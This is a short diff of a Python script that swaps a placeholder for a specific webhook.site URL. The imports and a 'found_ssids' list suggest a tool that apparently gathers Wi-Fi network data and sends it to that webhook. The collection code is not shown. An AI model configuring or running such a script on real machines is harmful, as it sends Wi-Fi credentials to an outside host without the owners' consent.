@@ -1,7 +1,7 @@
 import subprocess, os, sys, requests, re, urllib
 
 # Replace with your webhook
-url = 'https://webhook.site/###################'
+url = 'https://webhook.site/400a9a76-b61e-4ee7-a8c6-2b123ff32996'
 
 # Lists and regex
 found_ssids = []
